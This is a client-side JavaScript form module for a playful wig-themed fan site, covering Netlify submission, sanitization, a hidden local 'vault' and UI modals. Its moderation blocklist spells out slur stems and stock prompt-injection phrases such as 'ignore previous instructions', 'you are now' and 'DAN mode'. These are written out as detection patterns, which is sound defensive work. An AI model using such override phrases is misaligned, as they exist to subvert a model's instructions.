// ============================================================
// DLFI Form Submission Module
// ============================================================
// Submissions flow:
//   1. saveSubmission() persists locally to localStorage (for owner view)
//   2. sendToProvider() POSTs to Netlify Forms (server-side handler)
// No email addresses or API keys are embedded in this file.
// Configure the notification recipient in Netlify → Forms → Settings.
// ============================================================
(function () {
  'use strict';

  // Submissions go to Netlify Forms — handled server-side, no email or
  // access key exposed in client JS. Configure notification email in the
  // Netlify dashboard under Forms → Settings → Form notifications.
  const SUBMISSIONS_KEY = 'dlfi-submissions-v1';
  const VIEW_KEY = 'dlfi-view-mode';

  // ===================================================================
  // ============ FORM SUBMISSION + LOCAL STORAGE BACKUP ===============
  // ===================================================================

  function readSubs() {
    try { return JSON.parse(localStorage.getItem(SUBMISSIONS_KEY) || '[]'); }
    catch (e) { return []; }
  }
  function writeSubs(list) {
    try { localStorage.setItem(SUBMISSIONS_KEY, JSON.stringify(list)); } catch (e) {}
  }
  function saveSubmission(type, payload) {
    const all = readSubs();
    all.unshift({
      id: 'R-' + Math.random().toString(36).slice(2, 8).toUpperCase(),
      type, payload,
      at: new Date().toISOString()
    });
    if (all.length > 500) all.length = 500;
    writeSubs(all);
  }

  // Fire-and-forget POST to Netlify Forms.
  // Netlify intercepts POSTs to '/' that include a form-name field,
  // matches it against the static <form data-netlify="true"> in the HTML,
  // stores the submission, and emails the configured recipient — all
  // server-side, with no email address ever leaving the Netlify dashboard.
  function sendToProvider(type, payload) {
    const formName = type === 'report' ? 'report' : 'story';
    // Build a Akismet-friendly subject so submissions don't look like spam.
    const subjectBase = type === 'report' ? 'DLFI Disturbance Report' : 'DLFI Evidence Submission';
    const subject = payload.category ? `${subjectBase}: ${payload.category}`
                  : payload.title ? `${subjectBase}: ${payload.title}`
                  : subjectBase;
    const params = new URLSearchParams();
    params.append('form-name', formName);
    params.append('subject', subject);
    params.append('submitted_at', new Date().toISOString());
    Object.entries(payload).forEach(([k, v]) => params.append(k, v || ''));
    try {
      fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json' },
        body: params.toString()
      }).catch(() => {});
    } catch (e) {}
  }

  function collectForm(formEl) {
    const data = {};
    if (!formEl) return data;
    formEl.querySelectorAll('input, select, textarea').forEach(el => {
      // Netlify Forms requires the field NAME attribute to match what was in
      // the static form, so prefer that. Fall back to label/placeholder for
      // local-storage display only.
      const key = el.name
        || el.closest('.form-group')?.querySelector('.form-label')?.textContent.replace(/^[▸◆●\s]+/, '').trim()
        || el.placeholder
        || 'field';
      if (key && key !== 'bot-field' && key !== 'form-name') {
        data[key] = el.value || '';
      }
    });
    return data;
  }

  // ===================================================================
  // ============ SUBMISSION SANITIZATION ==============================
  // ===================================================================
  // Visitors should ONLY be able to send plain-text disturbance reports.
  // No links, no HTML, no scripts. This protects the site owner from
  // phishing/malware delivered via the contact form.
  const URL_RE = /(?:https?:\/\/|ftp:\/\/|www\.|javascript:|data:|file:|vbscript:|<script|<img|<svg|<iframe|onerror=|onclick=|onload=)/i;
  const TAG_RE = /<\/?[a-z][^>]*>/gi;
  const EMAIL_RE = /\b[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}\b/gi;

  // ===================================================================
  // ============ CONTENT MODERATION ===================================
  // ===================================================================
  // Block submissions containing profanity, slurs, threats, sexual
  // content, prompt-injection attempts, or personal-identifying data.
  // We normalize the text first (lowercase, strip diacritics, collapse
  // common leetspeak / censored variants like f*ck, sh!t, sh1t, fck)
  // BEFORE matching against the lists, so creative spellings still trip.
  //
  // This isn't perfect — no client-side filter is — but it stops the
  // vast majority of bad-faith submissions before they reach your inbox.
  function normalizeForModeration(text) {
    let v = String(text || '').toLowerCase();
    // strip accents
    v = v.normalize('NFKD').replace(/[\u0300-\u036f]/g, '');
    // common letter→symbol substitutions
    const subs = {
      '@': 'a', '4': 'a', 'á': 'a', 'à': 'a', 'ä': 'a', 'â': 'a',
      '8': 'b',
      '(': 'c', '¢': 'c', '©': 'c',
      '3': 'e', '€': 'e', 'é': 'e', 'è': 'e', 'ê': 'e',
      '6': 'g', '9': 'g',
      '#': 'h',
      '1': 'i', '!': 'i', '|': 'i', 'í': 'i', 'ï': 'i',
      '0': 'o', 'ó': 'o', 'ò': 'o', 'ö': 'o', 'ô': 'o', 'ø': 'o',
      'ph': 'f',
      '$': 's', '5': 's', '§': 's',
      '7': 't', '+': 't',
      '2': 'z',
      'ú': 'u', 'ü': 'u', 'û': 'u'
    };
    Object.entries(subs).forEach(([from, to]) => {
      v = v.split(from).join(to);
    });
    // Collapse PUNCTUATION (but NOT whitespace) inside words.
    // This turns f*ck → fck, f.u.c.k → fuck, sh!t → shit (! was already sub'd).
    // It does NOT eat the spaces between real words, so word boundaries survive.
    v = v.replace(/(\w)[\*\-\._'"`~^]+(\w)/g, '$1$2');
    v = v.replace(/(\w)[\*\-\._'"`~^]+(\w)/g, '$1$2');
    // collapse runs of identical letters: fuuuuck → fuck (keep at most 2)
    v = v.replace(/(\w)\1{2,}/g, '$1$1');
    // Generate a SECOND, fully-compacted view (no whitespace either) so we
    // can also catch "f u c k" style space-evasion. We test against both.
    return { spaced: v, compact: v.replace(/\s+/g, '') };
  }

  // Patterns matched as regex against the NORMALIZED text. Each pattern
  // is wrapped in word boundaries where appropriate; we use the bare list
  // form so it's readable. Categories are commented for clarity.
  // Many of these allow flexible internal characters to catch evasion.
  const MOD_PATTERNS = [
    // ── PROFANITY (and common censored variants) ─────────────────────
    /\b(fuck(ing|er|ed|s)?|fck|fuk|phuck|mother\s*fuc?k\w*)\b/,
    /\b(sh[i1]t(s|ty|head|face|stain)?|bullsh[i1]t)\b/,
    /\b(b[i1]tch(es|ass|y|in)?)\b/,
    /\b(a[s5]{2}h[o0]le|asshat|asswipe|jackass|dumbass|smartass)\b/,
    /\b(dipsh\w*|dumbf\w*|jerkoff|jackoff)\b/,
    /\b(cunt|twat)\w*/,
    /\b(damn|goddamn|goddamm\w*)\b/,
    /\b(piss(ed|ing|off)?)\b/,
    /\b(crap(py|head)?)\b/,
    /\b(prick|wank(er|ing)?)\b/,
    /\b(bastard\w*)\b/,
    /\b(douch\w*)\b/,
    // ── SLURS (race / ethnicity / religion / orientation / ability) ──
    // Listed by stems with flexible endings to catch evasion. Kept here
    // as a defense list — owner of the site has explicitly requested it.
    /\b(n[i1]gg\w*|n[i1]gr\w*)\b/,
    /\b(f[a4]gg?[o0]?t\w*|f[a4]g)\b/,
    /\b(d[i1]ke|dyke)\b/,
    /\b(tr[a4]nn?[i1y]\w*)\b/,
    /\b(ret[a4]rd\w*|sp[a4]z\w*)\b/,
    /\b(ch[i1]nk\w*|g[o0]{2}k\w*|j[a4]p\w*|sl[a4]nt-?eye\w*)\b/,
    /\b(sp[i1]c|wetb[a4]ck|beaner|w[e3]tb[a4]ck)\b/,
    /\b(kike|hymie)\b/,
    /\b(coon\b|jiggaboo|porch\s*monkey|tar\s*baby)/,
    /\b(crack[e3]r|honkey|whitey)\b/,
    /\b(t[o0]welhead|sand-?n\w*|raghead|cameljockey)\b/,
    /\b(mick|paddy|polack|kraut|wop|guido|dago)\b/,
    /\b(gypp?y|gyps[i1]e?s?)\b/,
    /\b(hwhore|whore\w*|slut\w*|hoebag|thot)\b/,
    // ── THREATS / VIOLENCE ───────────────────────────────────────────
    /\bkill\s+(you|u|yo?u?rself|him|her|them|that\s+\w+)\b/,
    /\bi(['']ll|\s*will|\s*ll)?\s*(kill|murder|hurt|beat|stab|shoot|hunt|find|destroy)\s+(you|u|him|her|them)\b/,
    /\b(murder|stab|shoot|behead|lynch|hang|strangle|choke)\s+(you|u|him|her|them|that)\b/,
    /\bi\s*know\s+where\s+(you|u|she|he|they)\s+(live|work|sleep|stay)\b/,
    /\bi(['']ll|\s*will|\s*ll)?\s*come\s+(for|after|find)\s+(you|u|him|her|them)\b/,
    /\b(rape|raping|raper)\b/,
    /\bbomb(ing)?\s+(you|the|your|their)\b/,
    /\b(school|church|public)\s*shoot\w*/,
    // ── SELF-HARM / SUICIDE ENCOURAGEMENT ────────────────────────────
    // Block cruel "go kys" / "kill yourself" / "neck yourself" content.
    /\b(k\s*y\s*s|kys)\b/,
    /\bkill\s*y\s*o\s*u\s*r\s*s\s*e\s*l\s*f\b/,
    /\b(go|ya\s*should|you\s*should)\s+(die|kms|off\s+yourself|hang\s+yourself|neck\s+yourself)\b/,
    /\b(neck|hang)\s*yourself\b/,
    /\bcommit\s+(suicide|sudoku)\b/,
    /\bdrink\s+bleach\b/,
    // ── SEXUAL CONTENT ───────────────────────────────────────────────
    /\b(porn(o|ography)?|nudes?|nsfw)\b/,
    /\b(pussy|p[u]ssy|coochie|vag\w*|clit|cock|dick|penis|boner|nutsack|ballsack|jizz|cum(shot|slut|dump|ming|med)?|semen)\b/,
    /\b(blowjob|handjob|rimjob|titj\w*|tittie?s|tit\b|boobs?|nipple|nip\s*slip)\b/,
    /\b(fingering|fucking|sucking|riding|eating)\s+(your|her|his|my|their)\s+\w+/,
    /\b(milf|gilf|dilf|hentai|gangbang|orgy|threesome)\b/,
    /\b(pedo\w*|loli\w*|child\s*p\w*|cp\b)\b/,
    // ── GORE / EXTREME VIOLENCE ──────────────────────────────────────
    /\b(gore|gory|disembowel|decapitat\w*|mutilat\w*|dismember\w*|skin\s+alive)\b/,
    // ── ILLEGAL ACTIVITY PROMOTION ───────────────────────────────────
    /\b(how\s+to\s+(make|build|cook)\s+(a\s+)?(bomb|meth|crystal|fentanyl|napalm))\b/,
    /\b(buy|sell|sourcing)\s+(meth|heroin|fentanyl|cocaine|crack|weed|guns?|illegal)\b/,
    /\b(child\s*porn|cp\b|csam)\b/,
    // ── PROMPT INJECTION / SYSTEM MANIPULATION ───────────────────────
    /\b(ignore|disregard|forget)\s+(all\s+)?(previous|prior|above|the\s+system)\s*(instructions?|prompts?|rules?|orders?)\b/,
    /\b(act\s+as|you\s+are\s+now|pretend\s+to\s+be|roleplay\s+as|simulate|jailbreak|dan\s+mode|developer\s+mode)\b/,
    /\b(system\s*:|assistant\s*:|<\|system\|>|<\|im_start\|>|<\|endoftext\|>)/i,
    /\b(api\s*key|access\s*token|private\s*key|seed\s*phrase|admin\s*password|sudo\s+rm)\b/,
    // ── SPAM / GIBBERISH (very long runs of one char, or all-symbols) ─
    /(.)\1{14,}/, // 15+ same character in a row
    /^[^a-z0-9\s]{40,}$/i // 40+ chars of pure symbols
  ];

  // Reasons map — when we find a match we know which BUCKET it fell into
  // so we can show the visitor a category-appropriate, on-brand message.
  // NOTE: the real classifyOffense lives below — this older version is
  // intentionally removed to avoid a name collision.

  function classifyOffense(spaced, compact) {
    const c = compact || spaced;
    const s = spaced;
    // Order matters — most-specific categories first.
    if (/\b(kys|kill\s*yourself|neck\s*yourself|hang\s*yourself|commit\s+(suicide|sudoku)|drink\s+bleach)\b/.test(s)
        || /(kys|killyourself|neckyourself|hangyourself|drinkbleach|commitsuicide)/.test(c)) return 'self-harm';
    if (/\b(kill|murder|stab|shoot|rape|behead|lynch|hang|strangle|bomb|hunt\s+you|find\s+you|come\s+(for|after)\s+you|know\s+where\s+you)\b/.test(s)
        || /(killyou|murderyou|stabyou|shootyou|rapeyou|knowwhereyou)/.test(c)) return 'threat';
    if (/\b(n[i1]gg|f[a4]gg?[o0]?t|f[a4]g\b|dyke|d[i1]ke|tr[a4]nn|ret[a4]rd|ch[i1]nk|g[o0]{2}k|j[a4]p\b|sp[i1]c|kike|coon\b|cracker|honkey|wetback|towelhead|raghead|gypp?y|whore|slut|thot)\w*/.test(s)
        || /(nigger|nigga|faggot|tranny|retard|chink|gook|spic|kike|wetback|towelhead|raghead)/.test(c)) return 'slur';
    if (/\b(porn|nudes?|cock|dick|pussy|penis|boobs?|tits?|nipple|blowjob|handjob|orgy|gangbang|cum|jizz|milf|hentai|pedo|loli|csam)\b/.test(s)
        || /(porn|nudes?|cock|dick|pussy|penis|blowjob|gangbang|hentai|pedo|loli|csam)/.test(c)) return 'sexual';
    if (/\b(gore|disembowel|decapitat|mutilat|dismember)\w*/.test(s)
        || /(gore|disembowel|decapitat|mutilat|dismember)/.test(c)) return 'gore';
    if (/\b(how\s+to\s+(make|build|cook)\s+(a\s+)?(bomb|meth|fentanyl|napalm)|sell\s+(meth|heroin|fentanyl)|child\s*p)/.test(s)) return 'illegal';
    if (/\b(ignore\s+(all\s+)?(previous|prior|above)\s+(instructions?|prompts?|rules?)|act\s+as|you\s+are\s+now|pretend\s+to\s+be|jailbreak|dan\s+mode|system\s*:|assistant\s*:)/.test(s)
        || /(ignoreprevious|ignoreprior|ignoreabove|actas|youarenow|pretendtobe|jailbreak|danmode)/.test(c)) return 'injection';
    if (/\b(fuck|fck|fuk|sh[i1]t|b[i1]tch|cunt|twat|asshole|bastard|wanker|prick|piss|crap|damn)\w*/.test(s)
        || /(fuck|fck|fuk|shit|bitch|cunt|twat|asshole|bastard|piss)/.test(c)) return 'profanity';
    if (/(.)\1{14,}/.test(s)) return 'spam';
    return 'profanity';
  }

  function looksToxic(text) {
    const norm = normalizeForModeration(text);
    if (MOD_PATTERNS.some((re) => re.test(norm.spaced) || re.test(norm.compact))) return true;
    // Extra: hits on the compact stream against word lists WITHOUT \b
    // catch "f u c k everyone" → "fuckeveryone" style space-evasion.
    return /(fuck|shit|bitch|cunt|nigger|nigga|faggot|tranny|retard|chink|kike|kys|killyou|killyourself|rapeyou)/.test(norm.compact);
  }

  function stripDangerous(text) {
    let v = String(text == null ? '' : text);
    v = v.replace(TAG_RE, '');                            // any HTML tag
    v = v.replace(EMAIL_RE, '[email removed]');           // email addresses
    v = v.replace(/\b(?:https?:\/\/|ftp:\/\/|www\.)\S+/gi, '[link removed]');
    v = v.replace(/javascript:|data:|vbscript:|file:/gi, '');
    v = v.replace(/[\u0000-\u001F\u007F]/g, '');          // control chars
    return v.trim();
  }
  function looksDangerous(text) {
    return URL_RE.test(String(text || ''));
  }
  function validatePayload(payload) {
    // Find any field whose value contains a URL/HTML/script-like token.
    const offenders = [];
    const toxic = [];
    Object.entries(payload).forEach(([k, v]) => {
      if (looksDangerous(v)) offenders.push(k);
      else if (looksToxic(v)) toxic.push(k);
    });
    return { offenders, toxic };
  }
  function sanitizePayload(payload) {
    const out = {};
    Object.entries(payload).forEach(([k, v]) => { out[k] = stripDangerous(v); });
    return out;
  }

  // Public: called by submitReport / submitStory in dlfi-app.js
  // Returns: { ok: true, payload } on success,
  //          { ok: false, reason: 'links'|'toxic', offenders, category } if blocked.
  window.dlfiSaveSubmission = function (type, formEl) {
    const raw = collectForm(formEl);
    const v = validatePayload(raw);
    if (v.offenders.length) {
      return { ok: false, reason: 'links', offenders: v.offenders };
    }
    if (v.toxic.length) {
      // Find the worst category among the offending fields
      const norms = v.toxic.map(k => normalizeForModeration(raw[k]));
      const spaced = norms.map(n => n.spaced).join(' ');
      const compact = norms.map(n => n.compact).join(' ');
      return { ok: false, reason: 'toxic', offenders: v.toxic, category: classifyOffense(spaced, compact) };
    }
    const payload = sanitizePayload(raw);
    saveSubmission(type, payload);
    sendToProvider(type, payload);
    return { ok: true, payload };
  };

  // Public: HTML-escape helper for safely rendering submission text
  window.dlfiEscapeText = function (s) {
    return String(s == null ? '' : s)
      .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
  };

  // ===================================================================
  // ============ BLOCKED-SUBMISSION MODAL (on-brand, hilarious) =======
  // ===================================================================
  // Re-uses the same brand-confirm modal vocabulary as "Links Are Not
  // Allowed" so visitors get one consistent rejection style. Picks a
  // category-appropriate stamp + headline + body line so the page stays
  // playful, not preachy.
  const BLOCK_COPY = {
    links: {
      stamp: 'CONTRABAND',
      title: 'Links Are <em>Not</em> Allowed.',
      body: `The Department doesn't click links from strangers — that's how lace fronts get installed by force. Rewrite your report using <span class="pink">words only</span>.`
    },
    profanity: {
      stamp: 'LANGUAGE',
      title: 'Watch Your <em>Mouth</em>, Recruit.',
      body: `The Department is filthy with secrets — not with curse words. Get the asterisks, the symbols, and the creative spellings out of there. Composure is louder than profanity.`
    },
    slur: {
      stamp: 'REJECTED',
      title: 'We Investigate <em>Lace</em>, Not Hate.',
      body: `Slurs are not part of our jurisdiction and never will be. Take that energy elsewhere. The Department's door does not open for that.`
    },
    threat: {
      stamp: 'DENIED',
      title: 'Threats Get You <em>Filed</em>, Not Filed With Us.',
      body: `Threatening language is logged and discarded — we keep receipts, not bodies. If you have a real concern about safety, contact local authorities. Otherwise, lower your voice and try again.`
    },
    'self-harm': {
      stamp: 'WITH CARE',
      title: "That's <em>Not</em> The Energy.",
      body: "We don't accept submissions encouraging anyone to harm themselves \u2014 including jokes. If you're struggling, please reach out to <span class=\"pink\">988</span> (US) or your local crisis line. The Department wants you here."
    },
    sexual: {
      stamp: 'INDECENT',
      title: 'This Is A <em>Lace</em> Investigation Bureau.',
      body: `Sexual content does not belong in the dispatch line. Keep it to the wig crimes. The wig crimes are scandalous enough.`
    },
    gore: {
      stamp: 'GRAPHIC',
      title: 'Too <em>Graphic</em>, Recruit.',
      body: `Graphic violence has been removed. We investigate lace fronts, not crime scenes. Tone it down and try again.`
    },
    illegal: {
      stamp: 'UNLAWFUL',
      title: 'The Department <em>Does Not</em> Coordinate Felonies.',
      body: `That submission appears to promote illegal activity. We file reports, not how-to manuals. Try again with something the Department is actually equipped to handle.`
    },
    injection: {
      stamp: 'NICE TRY',
      title: 'You Tried It. The Department <em>Noticed</em>.',
      body: `Prompt-injection attempts, system overrides, and "ignore previous instructions" maneuvers are filed straight into the shredder. The Department does not take orders from contact forms.`
    },
    spam: {
      stamp: 'INSUFFICIENT',
      title: "That's Not A Report. That's <em>Keyboard Mash</em>.",
      body: "We need actual words. Tell us what happened, who, and where \u2014 using sentences, not symbols."
    }
  };
  window.dlfiBlockedModal = function (result) {
    if (!result) return;
    const reason = result.reason || 'links';
    const category = (reason === 'toxic') ? (result.category || 'profanity') : reason;
    const copy = BLOCK_COPY[category] || BLOCK_COPY.profanity;
    const fields = (result.offenders && result.offenders.length)
      ? `<br><span class="pn-block-meta">Affected fields: <span class="pink">${result.offenders.join(', ')}</span></span>`
      : '';
    if (window.dlfiConfirm) {
      window.dlfiConfirm({
        stamp: copy.stamp,
        title: copy.title,
        body: copy.body + fields,
        ok: "I'll Fix It",
        cancel: 'Cancel'
      }, () => {});
    } else {
      alert('Submission blocked: ' + category);
    }
  };

  // ===================================================================
  // ============ ADMIN SUBMISSIONS VAULT ==============================
  // ===================================================================

  function ensureAdminModal() {
    if (document.getElementById('admin-vault')) return;
    const el = document.createElement('div');
    el.id = 'admin-vault';
    el.innerHTML = `
      <div class="av-box">
        <button class="av-close dlfi-close" type="button" aria-label="Close"><span class="dc-x">×</span><span class="dc-lbl">CLOSE</span></button>
        <div class="av-head">
          <span>◆ SUBMISSIONS VAULT</span>
        </div>
        <h2 class="av-title">Departmental <span class="italic">Archive</span></h2>
        <div class="av-sub">Stored locally on this device · also sent to the owner's inbox</div>
        <div class="av-count-row"><span class="pink" id="av-count">0 records</span><span class="av-scroll-hint">↓ scroll for more</span></div>
        <div class="av-toolbar">
          <button class="btn-outline btn-sm" type="button" id="av-export"><span>Download Your Reports As Evidence</span><span>↓</span></button>
          <button class="btn-outline btn-sm" type="button" id="av-clear"><span>Clear All</span><span>×</span></button>
        </div>
        <div class="av-list" id="av-list"></div>
        <div class="av-foot">
          <strong>Visitors:</strong> these are stored on YOUR device only — every visitor sees only their own submissions. Use <strong>Download Your Reports As Evidence</strong> to save a copy to your phone or computer.
        </div>
      </div>
    `;
    document.body.appendChild(el);
    el.querySelector('.av-close').addEventListener('click', closeVault);
    el.addEventListener('click', (e) => { if (e.target === el) closeVault(); });
    el.querySelector('#av-export').addEventListener('click', exportSubs);
    el.querySelector('#av-clear').addEventListener('click', clearSubs);
  }
  function renderVault() {
    ensureAdminModal();
    const subs = readSubs();
    document.getElementById('av-count').textContent = subs.length + ' record' + (subs.length === 1 ? '' : 's');
    const list = document.getElementById('av-list');
    if (!subs.length) {
      list.innerHTML = `<div class="av-empty">No submissions yet. They'll appear here automatically.</div>`;
      return;
    }
    list.innerHTML = subs.map(s => {
      const date = new Date(s.at).toLocaleString();
      const tag = s.type === 'report' ? 'DISTURBANCE REPORT' : 'EVIDENCE SUBMISSION';
      const rows = Object.entries(s.payload || {}).map(([k, v]) =>
        `<div class="av-row"><span class="av-k">${escapeHTML(k)}</span><span class="av-v">${escapeHTML(v || '—')}</span></div>`
      ).join('');
      return `
        <div class="av-card">
          <div class="av-card-head">
            <span class="av-id">${escapeHTML(s.id)}</span>
            <span class="av-type">${tag}</span>
            <span class="av-date">${escapeHTML(date)}</span>
          </div>
          ${rows || '<div class="av-empty" style="padding:0.6rem 0;">(empty form)</div>'}
        </div>
      `;
    }).join('');
  }
  function escapeHTML(s) {
    return String(s == null ? '' : s)
      .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
  }
  function openVault() {
    ensureAdminModal();
    renderVault();
    document.getElementById('admin-vault').classList.add('is-on');
  }
  function closeVault() {
    const el = document.getElementById('admin-vault');
    if (el) el.classList.remove('is-on');
  }
  function exportSubs() {
    const blob = new Blob([JSON.stringify(readSubs(), null, 2)], { type: 'application/json' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    const date = new Date().toISOString().slice(0,10);
    const names = [
      'the-receipts-she-doesnt-want-you-to-have',
      'DLFI-evidence-locker',
      'moisturized-receipts-archive',
      'the-folder-her-edges-feared',
      'departmental-receipts-classified',
      'lace-tearer-field-receipts',
      'composure-as-evidence',
      'the-archive-she-cant-reach'
    ];
    const fun = names[Math.floor(Math.random() * names.length)];
    a.download = `${fun}__${date}.json`;
    a.click();
    setTimeout(() => URL.revokeObjectURL(a.href), 1000);
  }
  function clearSubs() {
    showConfirm({
      stamp: 'IRREVERSIBLE',
      title: 'Clear All Submissions?',
      body: 'This wipes every story and report stored on this device. Sent emails are not affected.',
      ok: 'Clear Vault',
      cancel: 'Keep Records'
    }, () => {
      localStorage.removeItem(SUBMISSIONS_KEY);
      renderVault();
    });
  }

  // Triggers to open the vault:
  // 1) URL hash
  if (location.hash === '#submissions-vault') openVault();
  window.addEventListener('hashchange', () => {
    if (location.hash === '#submissions-vault') openVault();
  });
  // 2) Key sequence on desktop: V A U L T within 2s
  let keyBuf = '';
  let keyTimer = null;
  document.addEventListener('keydown', (e) => {
    if (e.target.matches('input, textarea, [contenteditable]')) return;
    if (!/^[a-zA-Z]$/.test(e.key)) return;
    keyBuf = (keyBuf + e.key.toLowerCase()).slice(-5);
    if (keyBuf === 'vault') { openVault(); keyBuf = ''; }
    clearTimeout(keyTimer);
    keyTimer = setTimeout(() => { keyBuf = ''; }, 2000);
  });
  // 3) Tap the DLFI nav logo 5 times within 2s
  let logoTaps = 0;
  let logoTimer = null;
  document.addEventListener('click', (e) => {
    const logo = e.target.closest('.nav-logo, .nav-seal');
    if (!logo) return;
    logoTaps++;
    clearTimeout(logoTimer);
    logoTimer = setTimeout(() => { logoTaps = 0; }, 2000);
    if (logoTaps >= 5) { logoTaps = 0; openVault(); }
  });

  window.openSubmissionsVault = openVault;

  // ===================================================================
  // ============ PHONE / DESKTOP VIEW TOGGLE ==========================
  // ===================================================================

  function applyViewMode(mode) {
    const meta = document.querySelector('meta[name="viewport"]');
    if (!meta) return;
    if (mode === 'desktop') {
      // Force-render the page at desktop width on small screens
      const scale = Math.max(0.2, window.innerWidth / 1280);
      meta.setAttribute('content', `width=1280, initial-scale=${scale.toFixed(3)}, maximum-scale=${scale.toFixed(3)}, user-scalable=yes`);
      document.body.classList.add('force-desktop');
    } else {
      meta.setAttribute('content', 'width=device-width, initial-scale=1.0, viewport-fit=cover');
      document.body.classList.remove('force-desktop');
    }
    try { localStorage.setItem(VIEW_KEY, mode); } catch (e) {}
    // Update toggle button state
    document.querySelectorAll('.view-toggle .vt-opt').forEach(b => {
      b.classList.toggle('is-on', b.dataset.mode === mode);
    });
  }
  function isLikelyPhone() {
    return matchMedia('(pointer: coarse)').matches || window.innerWidth < 800;
  }
  // Note: the Phone/Desktop view-toggle UI was removed — phone users get the
  // native phone view, and we now expose a "Pin DLFI To Home Screen" assignment
  // card on the recruit page instead (see dlfi-mobile.js / dlfi-pin).
  function initViewMode() {
    // Clear any legacy stored "desktop" override so nothing forces desktop layout
    try { localStorage.removeItem(VIEW_KEY); } catch (e) {}
    // Remove any stale toggle node from prior versions if it somehow exists
    document.querySelectorAll('.view-toggle').forEach(n => n.remove());
    applyViewMode('phone');
  }

  // ===================================================================
  // ============ BRANDED CONFIRM MODAL (replaces window.confirm) ======
  // ===================================================================

  function ensureConfirmModal() {
    if (document.getElementById('dlfi-confirm')) return;
    const el = document.createElement('div');
    el.id = 'dlfi-confirm';
    el.innerHTML = `
      <div class="dc-box">
        <div class="dc-stamp" id="dc-stamp">HOLD ON</div>
        <h2 class="dc-title" id="dc-title">Confirm action</h2>
        <p class="dc-body" id="dc-body">Are you sure?</p>
        <div class="dc-actions">
          <button class="btn-outline" type="button" id="dc-cancel"><span id="dc-cancel-label">Cancel</span></button>
          <button class="btn-primary" type="button" id="dc-ok"><span id="dc-ok-label">Confirm</span><span>→</span></button>
        </div>
      </div>
    `;
    document.body.appendChild(el);
    el.addEventListener('click', (e) => { if (e.target === el) closeConfirm(); });
  }
  let pendingOk = null;
  function closeConfirm() {
    const el = document.getElementById('dlfi-confirm');
    if (el) el.classList.remove('is-on');
    pendingOk = null;
  }
  function showConfirm(opts, onOk) {
    ensureConfirmModal();
    const el = document.getElementById('dlfi-confirm');
    document.getElementById('dc-stamp').textContent = opts.stamp || 'HOLD ON';
    document.getElementById('dc-title').innerHTML = opts.title || 'Confirm';
    document.getElementById('dc-body').innerHTML = opts.body || '';
    document.getElementById('dc-ok-label').textContent = opts.ok || 'Confirm';
    document.getElementById('dc-cancel-label').textContent = opts.cancel || 'Cancel';
    pendingOk = onOk;
    // Re-bind handlers (cheap)
    document.getElementById('dc-cancel').onclick = closeConfirm;
    document.getElementById('dc-ok').onclick = () => { const fn = pendingOk; closeConfirm(); if (fn) fn(); };
    el.classList.add('is-on');
  }
  window.dlfiConfirm = showConfirm;

  // ===================================================================
  // ============ ENHANCE ALL MODAL CLOSE BUTTONS ======================
  // ===================================================================
  // Replace every "✕" / "×" only icon with a clear "× CLOSE" label so
  // non-technical users immediately know how to close popups.
  function enhanceCloseButtons() {
    document.querySelectorAll('.modal-close, .mm-close, .pm-close, .av-close').forEach(btn => {
      if (btn.dataset.enhanced) return;
      btn.dataset.enhanced = '1';
      const text = (btn.textContent || '').trim();
      if (text === '×' || text === '✕' || text === '×CLOSE' || text === '') {
        btn.innerHTML = '<span class="dc-x" aria-hidden="true">×</span><span class="dc-lbl">CLOSE</span>';
      }
      btn.setAttribute('aria-label', 'Close');
      btn.classList.add('dlfi-close');
    });
  }
  // Watch for modals opening/closing → toggle body.modal-open
  function syncModalOpenClass() {
    const anyOpen = !!document.querySelector(
      '.modal-overlay.open, #admin-vault.is-on, #dlfi-confirm.is-on, #promotion-modal.is-on, #module-modal.is-on'
    );
    document.body.classList.toggle('modal-open', anyOpen);
  }
  // Run after first paint AND watch for dynamically inserted modals
  new MutationObserver(() => { enhanceCloseButtons(); syncModalOpenClass(); }).observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['class'] });

  // ===================================================================
  // ============ POPUP SCROLL HINT ====================================
  // ===================================================================
  // For any modal whose body is scrollable, fade in a "↓ scroll for more"
  // indicator until the user has scrolled.
  function watchScrollableModals() {
    document.querySelectorAll('.modal-box, .mm-box, .av-box, .pm-box, .dc-box').forEach(box => {
      if (box.dataset.scrollHinted) return;
      box.dataset.scrollHinted = '1';
      const update = () => {
        const overflows = box.scrollHeight > box.clientHeight + 4;
        const atBottom = box.scrollTop + box.clientHeight >= box.scrollHeight - 4;
        box.classList.toggle('has-scroll', overflows && !atBottom);
      };
      box.addEventListener('scroll', update);
      // Re-check on resize / content change
      const ro = new ResizeObserver(update);
      ro.observe(box);
      requestAnimationFrame(update);
    });
  }
  // Run when any modal opens
  document.addEventListener('click', () => setTimeout(watchScrollableModals, 100), true);

  // ===================================================================
  // ============ PHONE NAV SWIPE HINT =================================
  // ===================================================================
  function nudgeNavOnFirstView() {
    if (!isLikelyPhone()) return;
    if (localStorage.getItem('dlfi-nav-nudged') === '1') return;
    const nav = document.querySelector('nav');
    if (!nav) return;
    // Briefly scroll the nav-links so the user sees there's more content
    setTimeout(() => {
      try {
        nav.scrollTo({ left: 60, behavior: 'smooth' });
        setTimeout(() => nav.scrollTo({ left: 0, behavior: 'smooth' }), 700);
        localStorage.setItem('dlfi-nav-nudged', '1');
      } catch (e) {}
    }, 800);
  }
  // Override the earlier handler with one that prefers window.open but
  // falls back gracefully across embed/iframe contexts.
  window.openYouTubeChannel = function (ev) {
    if (ev) ev.preventDefault();
    const url = 'https://www.youtube.com/@UnapologeticExotical';
    let opened = null;
    try { opened = window.open(url, '_blank', 'noopener,noreferrer'); } catch (e) {}
    if (!opened) {
      // If a popup blocker or iframe sandbox prevented opening a new tab,
      // navigate the top-most window instead. If that's also blocked, the
      // anchor's href will still take the user there via default behavior.
      try { window.top.location.href = url; }
      catch (e) {
        try { window.parent.location.href = url; }
        catch (e2) { window.location.href = url; }
      }
    }
    if (window.DLFIAudio && window.DLFIAudio.click) window.DLFIAudio.click();
  };

  // ===================================================================
  // ============ INIT =================================================
  // ===================================================================
  function init() {
    initViewMode();
    ensureConfirmModal();
    enhanceCloseButtons();
    watchScrollableModals();
    nudgeNavOnFirstView();
    syncModalOpenClass();
  }
